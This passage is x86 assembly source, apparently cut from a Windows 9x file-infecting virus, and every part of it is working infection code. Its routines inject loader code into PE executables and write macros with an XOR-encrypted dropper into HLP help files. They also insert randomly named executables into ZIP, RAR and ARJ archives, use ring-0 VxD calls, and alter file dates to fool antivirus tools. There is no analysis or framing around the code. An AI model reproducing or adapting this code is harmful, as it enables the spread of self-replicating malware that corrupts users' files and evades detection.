           MOV INTRUD_OFF[EDX],EAX
           LEA EDI,OLD_PECODE[EDX]
           PUSH    ESI
           XOR ECX,ECX
           MOV CL,LEN_LOADER
           REP MOVSB
           CALL    SPE_THUNK
           POP EDI
           LEA ESI,SPE32_BUFF[EDX]
           REP MOVSB
           POP EAX
           LEA ESI,MAIN_BUFF[EDX]
           MOV CX,SIZE_MBUFF
           CALL    WRITE_FILE
   GO1_INF_EXIT:   JB  INF_EXIT
           MOV EDI,ESI
           MOV ESI,EDX
           MOV ECX,12345678H
           GOFF    CURRENT_LEN,4
           PUSH    ECX EDI
           REP MOVSB
           POP ESI ECX
           PUSH    ECX EBX
           MOV EAX,12345678H
           GOFF    MASK_CR,4
           SHR ECX,1
           GOFF    LOOP_CR
           SHR ECX,1           ;NOP/NOP
   LOOP_CR_IMM:    SUB EDI,4           ;SUB EDI,2
           MOV EBX,[EDI]
           DB  LEN_FILL_CRYPT DUP (90H)
           GOFF    END_LOOP_CR
           DB  90H         ;66H
           MOV [EDI],EBX
           LOOP    LOOP_CR_IMM
           POP EBX ECX
           MOV EAX,12345678H
           GOFF    PHYS_BODY_OFF,4
           CALL    WRITE_FILE
           LEA ESI,PHEADER[EDX]
           MOV AL,1 PTR [PEH_NUMOFOBJECT.ESI]
           IMUL    EAX,SIZE OBJECT_TABLE
           ADD AX,SIZE PE_HEADER
           XCHG    EAX,ECX
           MOV AX,[ESI.DOSH_LFANEW-SIZE DOS_HEADER]
           JMP SET_WRITE_FILE

   ;------------------------------------------------
   CORR_SIZE_ECX:  MOV EAX,ECX
   CORR_SIZE:  PUSH    EDX
           XOR EDX,EDX
           DIV [PEH_OBJALIGN.ESI]
           AND EDX,EDX
           JE  NO_ALIGN
           INC EAX
   NO_ALIGN:   MUL [PEH_OBJALIGN.ESI]
           POP EDX
           MOV [OT_VIRTSIZE.EDI],EAX
           RETN

   ;------------------------------------------------
   MACRO_FNAME PROC
           PUSH    ESI
           LEA ESI,RDROP_NAME[EDX]
           MOV EAX,'\\:C'
           STOSD
           SHR EAX,16
           STOSW
   STORE_NLETT:    MOVSB
           CMP 1 ptr [esi],'.'
           JNE STORE_NLETT
           MOV EAX,'PMT.'
           GOFF    TEMP_EXT,3
           STOSD
           POP ESI
   INF_EXIT:   RET
           ENDP

   ;------------------------------------------------
           GOFF    INF_HLP
           DEC EAX         ;EAX = 0
           CALL    GET_RANDOM
           LEA EDI,FIRST_DROP_MASK[EDX]
           STOSW
           SHR EAX,16
           MOV RELO_MASK2[EDI-2],AX
           LODSD               ;HLP_HEADER
           CMP EAX,HLP_MAGIC
           JNE INF_EXIT
   ;1. READ BEGIN OF HLP-DIRECTORY
           LODSD               ;HLP_START_DIRECTORYSTART
           MOV EDI,ESI
           CMPSD               ;LEA ESI,[ESI+SIZE HLP_START-8]
           CMPSD
           MOV CH,LEN_HLP_DIR SHR 8    ;CL=0
           CALL    READ_FILE
           JB  INF_EXIT
   ;2. FIND "|SYSTEM" STRING AND GET OFFSET
           MOV AL,'|'
   FIND_SYSTEM:    REPNE   SCASB
           JNE INF_EXIT
           CMP 4 PTR [EDI],'TSYS'  ;"|SYSTEM" BLOCK?
           JNE FIND_SYSTEM
           XCHG    EAX,ECX
           MOV CL,SIZE FILE_HEADER+SIZE SYSTEM_HEADER
           MOV EAX,[ESI.HLP_START_ENTIREFILESIZE-SIZE HLP_START]
           XCHG    EAX,[EDI+7]     ;STORE NEW "SYSTEM" OFFSET
   ;3. READ SYSTEM PAGE (LENGTH READ BEFORE)
           LEA ESI,SYS_FILE_HEADER[EDX]
           LEA EDI,[EAX+ECX]       ;OFFSET "SYSTEM" DATA
           CALL    READ_FILE
           JB  INF_EXIT
           CMP [ESI+(SIZE FILE_HEADER).SYSTEM_HEADER_MINOR],16
           JBE INF_EXIT
   ;4. CHECK SECONDS IF FILE ALREADY INFECTED
           CMP AL,1 PTR [ESI+(SIZE FILE_HEADER).SYSTEM_HEADER_GENDATE]
           JE  INF_EXIT
           MOV 1 PTR [ESI+(SIZE FILE_HEADER).SYSTEM_HEADER_GENDATE],AL
   ;5. GENERATE OUR MACROS
           PUSH    EDI
           LEA EDI,[ESI+ECX]       ;BUFF4MACRO
           CALL    GEN_MACROS      ;EXIT: EAX=MACROLENGTH
   ;6. CORRECT USED "SYSTEM" LENGTH
           ADD [ESI.FILE_HEADER_USEDSPACE],EAX
           ADD [ESI.FILE_HEADER_RESERVEDSPACE],EAX
   ;7. WRITE MACRO HEADERS+OUR MACRO IN THE END OF MODULE
           LEA ECX,[EAX+SIZE FILE_HEADER+SIZE SYSTEM_HEADER]
           CALL    HLP_WRITE_FILE
           POP EDI
           JB  INF_EXIT
           LODSD               ;FILE_HEADER_RESERVEDSPACE
           SUB EAX,ECX
   ;8. REWRITE OLD "SYSTEM" DATA IN THE END OF MODULE
           MOV CX,LEN_IOBUFF-4
   WRITE_NEXT_BLK: SUB EAX,ECX
           JAE IS_LONG_DATA
           ADD ECX,EAX
           XOR EAX,EAX
   IS_LONG_DATA:   PUSH    EAX
           MOV EAX,EDI
           ADD EDI,ECX
           CALL    READ_FILE
           JB  EXIT_READWRITE
           CALL    HLP_WRITE_FILE
   EXIT_READWRITE: POP EAX
           JB  WAS_ERROR
           AND EAX,EAX
           JNE WRITE_NEXT_BLK
   ;9. WRITE CORRECTED HLP_HEADER (VIA WRITE_FILE)
           LEA ESI,HLP_HEADER[EDX]
           PUSH    SIZE HLP_START
           POP ECX
           CALL    WRITE_FILE      ;ASSUME THAT EAX=0
   ;10. CREATE AND WRITE ENCRYPTED DROPPER IN THE END OF FILE (VIA HLP_WRITE_FILE)
           CALL    SPE_THUNK       ;ECX=LENGTH OF DROPPER
           PUSH    ECX ESI
           LEA EDI,FIRST_DROP_MASK[EDX]
           MOV AX,[EDI]
   ENCRYPT_HDROP:  XOR [ESI],AX
           ADD AX,RELO_MASK2[EDI]
           INC ESI
           LOOP    ENCRYPT_HDROP
           POP ESI ECX
           CALL    HLP_WRITE_FILE
   ;11. WRITE HLP_DIRECTORY WITH CORRECTED OFFSET OF "SYSTEM" BLOCK
           LEA ESI,HLP_DIRECTORY[EDX]
           MOV EAX,[ESI.HLP_START_DIRECTORYSTART-SIZE HLP_START]
           MOV CX,LEN_HLP_DIR AND 0FF00H

   ;------------------------------------------------
   SET_WRITE_FILE: CALL    SET_DATE
           JMP WRITE_FILE

   ;------------------------------------------------
   READ_FILE_BUFF_0:
           XOR EAX,EAX
   READ_FILE_BUFF: LEA ESI,MAIN_BUFF[EDX]
           MOV CX,SIZE_MBUFF
           JMP READ_FILE

   ;------------------------------------------------
   ZIP_READ_FILE:  ADD EAX,ZIP_CUR_OFF[EDX]
           MOV ZIP_CUR_OFF[EDX],EAX
   ;ENTRY: EAX=POS,ECX=LENGTH,EBX=HANDLE,ESI=&BUFFER4READ
   ;EXIT: CF=1 IF ERROR AND EAX=ERROR CODE OR EAX=(REAL BYTES READ-LENGTH)
   READ_FILE   PROC
           PUSH    EDX
           MOV DX,R0_READFILE
   GO_READ:    XCHG    EAX,EDX
           CALL    FILE_IO
           POP EDX
           JB  WAS_ERROR
           SUB EAX,ECX
   WAS_ERROR:  RET
           ENDP

   ;------------------------------------------------
   HLP_WRITE_FILE: MOV EAX,[HLP_HEADER.HLP_START_ENTIREFILESIZE][EDX]
           ADD [HLP_HEADER.HLP_START_ENTIREFILESIZE][EDX],ECX

   ;------------------------------------------------
   WRITE_FILE: PUSH    EDX
           MOV DX,R0_WRITEFILE
           JMP GO_READ

   ;------------------------------------------------
   SET_DATE:   XOR 1 PTR [ESP+8],1     ;CHANGE TIME FOR FOOLING ADINF/AVPI
   SET_TIME:   PUSH    EAX
           CALL    GET_SYS_TIME
           MOV INF_TIME[EDX],EAX
           POP EAX
           RETN

   ;------------------------------------------------
   ;ENTRY: EDI=&BUFFER FOR STORING MACROS
   ;EXIT: EAX=LENGTH OF MACRO
   GEN_MACROS  PROC
           PUSH    EBX ESI EBP EDI
           LEA EDI,TEMP_EXT[EDX]
           CALL    GEN_EXT         ;EAX = 0
           LEA EDI,RDROP_NAME[EDX]
           CALL    GEN_NAME
           MOV EAX,'MOC.'
           STOSD
           XOR AL,AL
           STOSB
           CALL    GET_RANDOM_MSK
           XCHG    EAX,ECX
           CALL    GET_RANDOM_MSK
           MOV AH,CL
           ADD AX,'AA'
           LEA ESI,RUN_DROPPER[EDX]
           LEA EDI,MAIN_BUFF[EDX]
           MOV 2 PTR DS:UU_MASK[ESI],AX
           MOV CL,LEN_UUD
           REP MOVSB
           MOV CL,LEN_RDROP_CON
           XCHG    EAX,EBX
   UUE_BYTE:   LODSB
           PUSH    EAX
           SHR AL,4
           ADD AL,BL
           STOSB
           POP EAX
           AND AL,0FH
           ADD AL,BH
           STOSB
           LOOP    UUE_BYTE
           POP EDI
           PUSH    EDI
           LEA ESI,RR_MACRO[EDX]
           CALL    HLP_STORE
           LEA ESI,MAIN_BUFF[EDX]
           XOR EBP,EBP         ;FIRST ITERATION
           MOV EBX,(LEN_UUD+2*LEN_RDROP_CON) ;LENGTH OF MACROS
   NEXT_ITER:  PUSH    ESI
           CALL    HLP_STORE_DROP
           DEC EDI         ;SKIP '\0'
           MOV CL,HLP_LEN_LINE
           SUB EBX,ECX
           JAE NO_LAST_STR
           ADD ECX,EBX
           XOR EBX,EBX
   NO_LAST_STR:    POP ESI
           REP MOVSB
           CMP ECX,EBP
           XCHG    EAX,EBP         ;LENGTH ADDRESS
           MOV AL,'>'
           STOSB
           JE  FIRST_ITER
           STOSB
   FIRST_ITER: CALL    MACRO_FNAME
           PUSH    ESI
           CALL    HLP_STORE_SLEEP
           POP ESI
           AND EBX,EBX
           JNE NEXT_ITER
           CALL    HLP_STORE_DROP
           DEC EDI         ;SKIP '\0'
           DEC EDI
           MOV 4 PTR [EDI-4],' NER'
           XCHG    EAX,EBP
           CALL    MACRO_FNAME
           MOV AX,'* '
           STOSW
           MOV EAX,'MOC.'
           STOSD
           PUSH    EAX
           CALL    HLP_STORE_SLEEP
           LEA ESI,EXEC_MACRO_1[EDX]
           CALL    HLP_STORE
           DEC EDI         ;SKIP '\0'
           XCHG    EAX,EBP         ;LENGTH ADDRESS
           CALL    MACRO_FNAME
           POP 4 PTR [EDI-4]
           MOV CL,LEN_EXEC_2
           REP MOVSB
           CALL    CORR_LENGTH
           XCHG    EAX,EDI
           POP EDI
           SUB EAX,EDI         ;LENGTH
           POP EBP ESI EBX
           RET
           ENDP

   ;------------------------------------------------
   HLP_STORE_SLEEP:
           MOV EAX,')0,"'
           STOSD
           MOV AX,")'"
           STOSW
           CALL    CORR_LENGTH
           LEA ESI,SLEEP_MACRO[EDX]
           JMP HLP_STORE
   HLP_STORE_DROP:
           LEA ESI,DROP_MACRO[EDX]
   HLP_STORE   PROC
           PUSH    ID_CONFIG
           POP EAX
           STOSW
           PUSH    EDI
           XOR EAX,EAX
           STOSW
           XCHG    EAX,ECX
           PUSH    ESI
           LEA ESI,CHK_NT[EDX]
           MOV CL,LEN_CHK_NT
           REP MOVSB
           POP ESI
           MOV CL,LEN_CHK_NT
   SZ_STORE:   LODSB
           STOSB
           INC ECX
           AND AL,AL
           JNE SZ_STORE
           POP EAX
           MOV [EAX],CX
           RET
           ENDP

   ;--------------------------------------
   ;RETURN: EAX - ENTRY TO INTRUDING
   NO_ENDP:    MOV ECX,EBX
           JECXZ   LIST_EMPTY
           XCHG    EAX,ECX
           CALL    GET_RANDOM
           MOV EAX,[ESP+EAX*4]
   CLEAR_STACK:    POP ESI
           DEC EBX
           JNE CLEAR_STACK
   LIST_EMPTY: POP EBX
           RETN
   FIND_PLACE: PUSH    EBX
           XOR EBX,EBX
   FIND_ENDP:  LODSB
           CMP AL,0C3H         ;RETN
           JE  FOUND_RETN
           CMP AL,0C2H         ;RETN X
           LOOPNE  FIND_ENDP
           JNE NO_ENDP
           INC ESI         ;SKIP X
           INC ESI
           DEC ECX
   FOUND_RETN: DEC ECX
           CMP ECX,0FH+LEN_LOADER
           JL  NO_ENDP
           PUSH    ESI
           ADD ESI,3
           AND ESI,NOT 3
   FIND_PROC:  LODSB
           CMP AL,55H          ;PUSH BP
           JNE NO_PUSH_BP
           CMP 2 PTR [ESI],0EC8BH
           JE  FOUND_PROC
           CMP 2 PTR [ESI],0E589H
           JE  FOUND_PROC
   NO_PUSH_BP: CMP AL,0C8H         ;ENTER X,0
           JNE NO_ENTER
           CMP CH,[ESI+2]
           JE  FOUND_PROC
   NO_ENTER:   CMP AL,53H          ;PUSH EBX
           JNE NO_PUSH_EBX
           CMP 2 PTR [ESI],5756H   ;PUSH ESI/PUSH EDI
           JE  FOUND_PROC
   NO_PUSH_EBX:    AND AL,NOT 2
           CMP AL,81H
           JNE NO_SUBADD
           CMP 1 PTR [ESI],0ECH    ;SUB ESP,X
           JE  FOUND_PROC
   NO_SUBADD:  ADD ESI,3
           MOV EAX,ESI
           AND AL,0CH
           JE  FIND_PROC
           CMP AL,8
           JAE FIND_PROC
   FOUND_PROC: XCHG    EAX,ESI
           POP ESI
           JNE FIND_ENDP
           DEC EAX
           PUSH    EAX ESI ECX
           XCHG    EAX,ESI
           MOV CX,LEN_LOADER
   FIND_ENDP_X:    LODSB
           AND AL,NOT 1
           CMP AL,0C2H         ;RETN/RETN X
           LOOPNE  FIND_ENDP_X
           POP ECX ESI EAX
           JE  FIND_ENDP
           PUSH    EAX
           INC EBX
           JMP FIND_ENDP

   ;------------------------------------------------
   ;ENTRY: EDI=&NAME BUFFER
   GEN_NAME    PROC
           MOV AL,3
           CALL    GET_RANDOM_BYTE
   GEN_EXT:    ADD AL,3            ;3-5 LETTERS
           XCHG    EAX,ECX
           PUSH    ECX
   NEXT_RCHAR: MOV AL,'Z'-'A'+1
           CALL    GET_RANDOM_BYTE
           ADD AL,'A'
           STOSB
           LOOP    NEXT_RCHAR
           POP ECX
           RET
           ENDP

   ;------------------------------------------------
   ;ENTRY: EDX=MEM DELTA
   ;EXIT: ECX=LENGTH OF DROPPER (EBX,EDX PRESERVED),ESI=&ENCRYPT_BUFF
   SPE_THUNK   PROC
           PUSH    EBX EDX
           LEA EDI,RET_2_32[EDX]
           XOR EAX,EAX
           PUSH    EAX
           DEC EAX
           SHRD    EAX,EDX,16
           PUSH    EAX
           SHR EDX,16
           INC EAX         ;0
           XCHG    AL,DL
           PUSH    DX
           MOV AH,10011010B        ;P=1/DPL=0/S=1/NON-CONF/READ=1/ACCESS=0
           PUSH    AX
           MOV ESI,ALLOCATE_GDT_SELECTOR
           PUSH    ESI
           CALL    VXD_CALL
           XCHG    EAX,EBX         ;CODE SELECTOR
           MOV 1 PTR [ESP+1],10010010B ;P=1/DPL=0/S=1/DATA/TOP/WRITE=1/ACCESS=0
           PUSH    ESI
           CALL    VXD_CALL
           ADD ESP,3*4
           CLI
           MOV DS,AX
           MOV ES,AX
           INC ESI         ;FREE_GDT_SELECTOR
           XOR ECX,ECX
           PUSH    ECX EBX ESI EAX EBP CS EDI BX SMALL OFF_SPE
           DB  66H
           RETF
           GOFF    RET_2_32
           PUSH    SS SS
           POP DS ES
           STI
           POP EBP ESI EBX
           PUSH    EBX
           CALL    VXD_CALL
           POP EAX
           PUSH    ESI EBX
           CALL    VXD_CALL
           MOVZX   ECX,DI
           POP EAX EAX EDX EBX
           LEA ESI,ENCRYPT_BUFF[EDX]
           RET
           ENDP

   ;------------------------------------------------
           GOFF    INF_RAR
           CMP 4 PTR [ESI],RAR_SIGN
           JNE EXIT_RAR_TOP
           ADD ESI,7+3
           TEST    1 PTR [ESI],1           ;VOLUME
           JNE EXIT_RAR_TOP
           AND 1 PTR [ESI],NOT 20H     ;SKIP AUTHEN. BIT
           MOV CL,SIZE RAR_HEAD_HDR-2
           DEC ESI
           CALL    GET_CRC32
           DEC ESI
           DEC ESI
           MOV [ESI],AX
           MOV CL,SIZE RAR_HEAD_HDR
           PUSH    7
           POP EAX
           CALL    WRITE_FILE
           JB  EXIT_RAR_TOP
           MOV AL,7
           ADD AX,[ESI.RAR_HEAD_SIZE]
   READ_RAR_FH:    PUSH    SIZE RAR_FILE_HDR
           POP ECX
           CALL    ZIP_READ_FILE
           JNB RAR_READ_OK
           AND AL,AL
           JS  GO_RAR_DONE
   EXIT_RAR_TOP:   RETN
   RAR_READ_OK:    CMP [ESI.RAR_F_HEAD_TYPE],RAR_FILE_SIGN
   GO_RAR_DONE:    JNE RAR_DONE
           MOV AL,1 PTR [ESI.RAR_F_HEAD_FLAGS]
           AND AL,11100000B
           CMP AL,11100000B            ;DIR?
           JE  SKIP_EXE_RAR
           INC 4 PTR ZIP_FILE_COUNTER[EDX]
           CMP [ESI.RAR_METHOD],RAR_STORED
           JNE NO_INF_RAR
           CMP CH,1 PTR [ESI.RAR_FILE_TIME]
           JNE NO_INF_RAR
           CMP 2 PTR [ESI.RAR_FILE_DATE],TROJAN_STAMP
           JNE EXIT_RAR_TOP
           ADD EAX,LARGE 4 PTR RAR_FNAME+TROJAN_NAME_SIZE
           LEA ESI,MAIN_BUFF[EDX]
           MOV CX,SIZE_MBUFF
           PUSH    ESI
           JMP ZIP_READ_FILE           ;RUN TROJAN
   NO_INF_RAR: ADD CX,[ESI.RAR_FNAME_SIZE]
           LEA EDI,OUR_RAR_FHEADER.RAR_FNAME[EDX]
           PUSH    ESI LARGE 4 PTR RAR_FNAME LARGE 4 PTR '\'
           CALL    TEST_EXEC
           POP ESI
           JB  SKIP_EXE_RAR
           PUSH    ESI
           LEA EDI,OUR_RAR_FHEADER.RAR_HOST_OS[EDX]
           LEA ESI,[ESI.RAR_HOST_OS]
           MOV [EDI-RAR_HOST_OS+RAR_F_HEAD_TYPE],RAR_FILE_SIGN
           MOV [EDI-RAR_HOST_OS+RAR_F_HEAD_FLAGS+1],80H
           MOVSB
           CMPSD
           MOVSD
           MOV [EDI-4],DL
           MOVSB
           MOV AL,RAR_STORED
           STOSB
           MOV EAX,ECX
           STOSW
           ADD AX,SIZE RAR_FILE_HDR
           MOV [EDI-RAR_FILE_ATTRIB+RAR_F_HEAD_SIZE],AX
           POP ESI
   SKIP_EXE_RAR:   MOVZX   EAX,[ESI.RAR_F_HEAD_SIZE]
           ADD EAX,[ESI.RAR_COMPRESSED_SIZE]
           JMP READ_RAR_FH
   RAR_DONE:   CALL    CHECK_ARCOUNT
           JB  GO_EXIT_ZIP_TOP
           PUSH    ESI ECX
           LEA ESI,OUR_RAR_FHEADER[EDX]+2
           MOV [ESI.RAR_COMPRESSED_SIZE-2],ECX
           MOV [ESI.RAR_ORIGINAL_SIZE-2],ECX
           MOV [ESI.RAR_CRC32-2],EAX
           MOV CX,[ESI.RAR_F_HEAD_SIZE-2]
           DEC ECX
           DEC ECX
           CALL    GET_CRC32
           DEC ESI
           DEC ESI
           MOV [ESI],AX
           INC ECX
           INC ECX
           CALL    ZIP1_INSERT_FILE
           POP ECX ESI
   GO_EXIT_ZIP_TOP:
           JB  EXIT_ZIP_TOP
   SET_INSERT: CALL    SET_DATE

   ;------------------------------------------------
   ;ENTRY: ESI=DATA FOR WRITE,ECX=SIZEOF(ESI),EAX=POS IN FILE
   ZIP1_INSERT_FILE:
           MOV EAX,ZIP_CUR_OFF[EDX]
   ZIP_INSERT_FILE:
           ADD ZIP_CENTRAL_OFF[EDX],ECX
           ADD ZIP_CUR_OFF[EDX],ECX
   INSERT_FILE:    PUSH    ESI EDI ECX EAX
           CALL    GETSIZE_FILE
           XCHG    EDI,EAX
           MOV CX,LEN_IOBUFF
   INSERT_NEXT:    SUB EDI,ECX
           CMP EDI,[ESP]
           JAE FULL_INSBUFF
           ADD ECX,EDI
           MOV EDI,[ESP]
           SUB ECX,EDI
   FULL_INSBUFF:   LEA ESI,INSERT_BUFF[EDX]
           MOV EAX,EDI
           CALL    READ_FILE
           JB  INS_POP
           MOV EAX,[ESP+4]
           ADD EAX,EDI
           CALL    WRITE_FILE
           JB  INS_POP
           CMP EDI,[ESP]
           JNE INSERT_NEXT
   INS_POP:    POP EAX ECX EDI ESI
           JNB WRITE_FILE
   EXIT_ZIP_TOP:   RET

   ;------------------------------------------------
           GOFF    INF_ZIP
   ;1. FIND CENTRAL AREA
   FIND_ZCENTRAL:  CMP [ESI.ZIP_LOC_SIGN_],ZIP_LOCAL_SIGN
           JNE EXIT_ZIP_TOP
           MOV CL,SIZE ZIP_CENTRAL_HEADER
           MOV AL,SIZE ZIP_LOCAL_HEADER
           ADD EAX,[ESI.ZIP_COMPRESSED_SIZE]
           ADD AX,[ESI.ZIP_SIZE_FNAME]
           ADD AX,[ESI.ZIP_EXTRA_FIELD_LENGTH]
           CALL    ZIP_READ_FILE
           JB  EXIT_ZIP_TOP
           CMP [ESI.ZIP_CENTR_SIGN_],ZIP_CENTRAL_SIGN
           JNE FIND_ZCENTRAL
           PUSH    4 PTR ZIP_CUR_OFF[EDX]
           POP 4 PTR ZIP_CENTRAL_OFF[EDX]
   ;2. FIND END HEADER AND CHECK FILE COUNTER (AND IF EXECUTABLE FILE PRESENT)
   FIND_ZEND:  TEST    1 PTR [ESI.ZIP_EXTRNL_FILE_ATTR_],FA_DIRECTORY
           JNE SKIP_EXE_TEST
           INC 4 PTR ZIP_FILE_COUNTER[EDX]
           CMP AL,1 PTR [ESI.ZIP_FILE_TIME_]
           JNE CONT_CHECK
           CMP AX,[ESI.ZIP_COMPRESSION_METHOD_]
           JE  EXIT_ZIP_TOP
   CONT_CHECK: ADD CX,[ESI.ZIP_SIZE_FNAME_]
           LEA EDI,OUR_LOCAL_HEADER.ZIP_LOCAL_FNAME[EDX]
           PUSH    ESI LARGE 4 PTR ZIP_CENTRAL_FNAME LARGE 4 PTR '/'
           CALL    TEST_EXEC
           JB  SKIP_EXE_TEST_POP
           MOV OUR_LOCAL_HEADER.ZIP_SIZE_FNAME[EDX],CX
           LEA EDI,OUR_CENTRAL_HEADER.ZIP_CENTRAL_FNAME[EDX]
           MOV OUR_CENTRAL_HEADER.ZIP_SIZE_FNAME_[EDX],CX
           REP MOVSB
           POP ESI
           LEA EDI,OUR_LOCAL_HEADER[EDX]
           MOV EAX,ZIP_LOCAL_SIGN
           STOSD
           MOV EAX,4 PTR [ESI.ZIP_VER_NED_TO_EXTR]
           STOSD
           INC EDI
           INC EDI
           MOV EAX,4 PTR [ESI.ZIP_FILE_TIME_]
           XOR AL,AL
           STOSD
           LEA EDI,OUR_CENTRAL_HEADER[EDX]
           PUSH    ESI
           MOVSD
           MOVSD
           MOVSD
           MOV [EDI-2],CX
           MOVSD
           MOV [EDI-4],CL
   SKIP_EXE_TEST_POP:
           POP ESI
   SKIP_EXE_TEST:  MOV CL,SIZE ZIP_CENTRAL_HEADER
           MOV EAX,ECX
           ADD AX,[ESI.ZIP_SIZE_FNAME_]
           ADD AX,[ESI.ZIP_EXTRA_FIELD_LENGTH_]
           ADD AX,[ESI.ZIP_FILE_COMMENT_LENGTH_]
           CALL    ZIP_READ_FILE
           JNB ZIP_READ_OK
           AND AL,AL
           JS  ZIP_READ_OK
   EXIT_ZIP:   RETN
   ZIP_READ_OK:    CMP [ESI.ZIP_CENTR_SIGN_],ZIP_CENTRAL_SIGN
           JE  FIND_ZEND
           CMP [ESI.ZIP_END_SIGN_],ZIP_END_SIGN
           JNE EXIT_ZIP
           CALL    CHECK_ARCOUNT
           JB  EXIT_ZIP
   ;3. GENERATE DROPPER AND INSERT LOCAL HEADER+DROPPER AT ZIP_CENTRAL_OFF
           PUSH    ESI ECX
           LEA ESI,OUR_LOCAL_HEADER[EDX]
           MOV [ESI.ZIP_CRC_32],EAX
           MOV [ESI.ZIP_COMPRESSED_SIZE],ECX
           MOV [ESI.ZIP_UNCOMPRESSED_SIZE],ECX
           LEA EDI,OUR_CENTRAL_HEADER[EDX]
           MOV [EDI.ZIP_CRC_32_],EAX
           MOV [EDI.ZIP_COMPRESSED_SIZE_],ECX
           MOV [EDI.ZIP_UNCOMPRESSED_SIZE_],ECX
           MOV EAX,ZIP_CENTRAL_OFF[EDX]
           MOV [EDI.ZIP_REL_OFF_OF_LOC_HDR_],EAX
           PUSH    SIZE ZIP_LOCAL_HEADER
           POP ECX
           ADD CX,[ESI.ZIP_SIZE_FNAME]
           CALL    ZIP_INSERT_FILE
           POP ECX ESI
           JB  EXIT_ZIP
           MOV EAX,ZIP_CENTRAL_OFF[EDX]
           CALL    ZIP_INSERT_FILE
   GO_EXIT_ZIP:    JB  EXIT_ZIP
   ;4. INSERT CENTRAL HEADER AT ZIP_CUR_OFF (ZIP_END_OFF)
           MOV ESI,EDI
           PUSH    SIZE ZIP_CENTRAL_HEADER
           POP ECX
           ADD CX,[ESI.ZIP_SIZE_FNAME_]
           PUSH    4 PTR ZIP_CENTRAL_OFF[EDX]
           CALL    ZIP1_INSERT_FILE
           LEA ESI,BUFF_ZIP_HEADER[EDX]
           POP [ESI.OFF_OF_STRT_OF_CENT_DIRECTORY]
           JB  GO_EXIT_ZIP
   ;5. WRITE END HEADER AT ZIP_CUR_OFF (NEW ZIP_END_OFF)
           ADD [ESI.SIZE_OF_THE_CENTRAL_DIRECTORY],ECX
           INC [ESI.TTL_NUM_OF_ENT_ON_THIS_DISK]
           INC [ESI.TTL_NUM_OF_ENT_IN_THE_CENT_DIR]
           PUSH    SIZE ZIP_END_HEADER
           POP ECX
           MOV EAX,ZIP_CUR_OFF[EDX]
   GO_WRITE_FILE:  JMP SET_WRITE_FILE

   ;------------------------------------------------
   FNAME_OFF   =   4 PTR [ESP+8]
   PATH_SEPARATOR  =   4 PTR [ESP+4]

   ;ENTRY: ESI=WORK BUFFER,EDI=&NAME BUFFER,ECX=READ LENGTH
   ;EXIT:  ESI=STORED PATH+NAME,ECX=SIZEOF(EDI)
   TEST_EXEC:  MOV EAX,ZIP_CUR_OFF[EDX]
           CALL    READ_FILE
           JB  TEST_ERR
           SUB ECX,FNAME_OFF
           ADD ESI,FNAME_OFF
   TEST_EXEC_SPEC: CMP DL,ZIP_EXEC_FLAG[EDX]
           JNE TEST_ERR_STC
           MOV EAX,[ESI+ECX-4]
           OR  EAX,20202000H
           CMP EAX,'moc.'
           JE  IS_EXECUTABLE
           CMP EAX,'exe.'
   TEST_ERR_STC:   STC
           JNE TEST_ERR
   IS_EXECUTABLE:  MOV EAX,PATH_SEPARATOR
   STORE_PATH: CMP AL,[ESI+ECX-1]
           LOOPNE  STORE_PATH
           JNE NO_ARC_PATH
           INC ECX
   NO_ARC_PATH:    PUSH    EDI ECX
           REP MOVSB
           CALL    GEN_NAME
           MOV AL,2
           CALL    GET_RANDOM_BYTE
           MOV EAX,'MOC.'
           JE  IS_ARC_COM
           MOV EAX,'EXE.'
   IS_ARC_COM: STOSD
           POP EAX ESI
           ADD ECX,EAX
           ADD ECX,4
           INC 1 PTR ZIP_EXEC_FLAG[EDX]
   TEST_ERR:   RETN    2*4

   ;------------------------------------------------
   CHECK_ARCOUNT:  CMP 4 PTR ZIP_FILE_COUNTER[EDX],MIN_ARC_FILES
           JB  ERR_INS
           SUB 1 PTR ZIP_EXEC_FLAG[EDX],1
           JB  ERR_INS
           CALL    SPE_THUNK

   ;------------------------------------------------
   ;ENTRY: ESI=&STRING,ECX=STRLEN
   ;EXIT:  EAX=CRC32
   GET_CRC32   PROC
           PUSH    ESI EBX ECX
           XOR EBX,EBX
           DEC EBX
   NEXT_BYTE:  PUSH    ECX
           XOR EAX,EAX
           LODSB
           XOR AL,BL
           PUSH    8
           POP ECX
           SHR EBX,CL
   NEXT_BIT:   SHR EAX,1
           JNB NO_ODD
           XOR EAX,0EDB88320H
   NO_ODD:     LOOP    NEXT_BIT
           XOR EBX,EAX
           POP ECX
           LOOP    NEXT_BYTE
           XCHG    EBX,EAX
           NOT EAX
           POP ECX EBX
   ERR_INS_POP:    POP ESI
   ERR_INS:    RET
           ENDP

   ;------------------------------------------------
           GOFF    INF_ARJ
           XOR EAX,EAX
   READ_ARJ_FH:    MOV CX,SIZE ARJ_HDR_STRUC+MAX_PATH+12
           CALL    ZIP_READ_FILE
           JNB ARJ_READ_OK
           ADD ECX,EAX
           JNB ERR_INS
           CMP ECX,4
           JB  ERR_INS
   ARJ_READ_OK:    CMP [ESI.ARJ_HEADER_ID],ARJ_SIGN
           JNE ERR_INS
           XOR EAX,EAX
           CMP [ESI.ARJ_BAS_HDR_SIZE],AX
           JE  ARJ_DONE
           TEST    [ESI.ARJ_FLAGS],4       ;VOLUME_FLAG
           JNE ERR_INS
           CMP [ESI.ARJ_FILE_TYPE],1       ;BINARY/TEXT
           JA  SKIP_EXE_ARJ
           INC 4 PTR ZIP_FILE_COUNTER[EDX]
           CMP AL,[ESI.ARJ_COMPRESS_METHOD]    ;ARJ_STORED
           JNE NO_INF_ARJ
           CMP AL,1 PTR [ESI.ARJ_FILE_TIME]
           JE  ERR_INS
   NO_INF_ARJ: LEA EDI,[ESI.ARJ_FNAME]
           TEST    [ESI.ARJ_FLAGS],8       ;EXTFILE_FLAG
           JE  NO_ARJ_EXT
           SCASD
   NO_ARJ_EXT: SUB ECX,LARGE 4 PTR ARJ_FNAME
           JB  ERR_INS
           PUSH    ESI
           MOV ESI,EDI
           REPNE   SCASB
           LEA ECX,[EDI-1]
           JNE ERR_INS_POP
           SUB ECX,ESI
           LEA EDI,OUR_ARJ_FHEADER.ARJ_FNAME[EDX]
           PUSH    EAX LARGE 4 PTR '/'
           CALL    TEST_EXEC_SPEC
           POP ESI
           JB  SKIP_EXE_ARJ
           LEA EDI,OUR_ARJ_FHEADER[EDX]
           MOV [EDI.ARJ_ENTRYNAME_POS],AX
           MOV AX,ARJ_SIGN
           STOSD
           ADD ECX,SIZE ARJ_HDR_STRUC-4+2
           MOV [EDI-2],CX
           MOV OUR_ARJ_FH_LEN[EDX],ECX
           MOV AL,1EH
